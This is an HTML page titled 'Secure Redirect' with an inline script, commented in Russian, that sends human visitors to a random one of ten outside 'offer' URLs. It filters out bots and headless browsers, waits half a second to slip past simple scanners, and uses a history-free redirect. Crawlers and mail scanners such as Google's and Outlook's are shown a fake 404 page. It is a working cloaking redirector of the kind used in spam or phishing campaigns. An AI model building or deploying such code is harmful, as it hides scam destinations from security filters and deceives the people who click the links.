<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Redirect</title>
    <script>
        function startRedirect() {
            // Список твоих 10 офферов
            var targetUrls = [
                "https://thetastarfashion.com/nfqv",
                "https://hardhatprotect.com/jell",
                "https://mammbypranallc.com/ku5e",
                "https://rigidconstr.com/aj4z",
                "https://hardhatprotect.com/mokf",
                "https://aarrinfclaimspecialist.com/ddva",
                "https://huppmusic.com/r4xd",
                "https://keysitc.com/j4z8",
                "https://susant.net/rvn0",
                "https://icontrollo.com/bnhe"
            ];

            // 1. Простейшая фильтрация ботов
            var ua = navigator.userAgent.toLowerCase();
            var isBot = /bot|spider|googlebot|crawler|headless|slurp|ia_archiver/i.test(ua);
            var isAutomation = navigator.webdriver;

            // 2. Если это человек
            if (!isBot && !isAutomation) {
                // Выбираем случайную ссылку
                var randomIndex = Math.floor(Math.random() * targetUrls.length);
                var finalUrl = targetUrls[randomIndex];

                // Задержка 0.5 секунды для имитации загрузки и обхода примитивных сканеров
                setTimeout(function() {
                    // Используем replace, чтобы не оставлять следов в истории браузера
                    window.location.replace(finalUrl);
                }, 500);
            } else {
                // Что увидят роботы Google/Outlook
                document.body.innerHTML = `
                    <div style="font-family:sans-serif; text-align:center; padding-top:20%;">
                        <h1 style="color:#555;">404 - Not Found</h1>
                        <p style="color:#888;">The requested resource could not be found on this server.</p>
                    </div>
                `;
            }
        }

        // Запуск при загрузке страницы
        window.onload = startRedirect;
    </script>
</head>
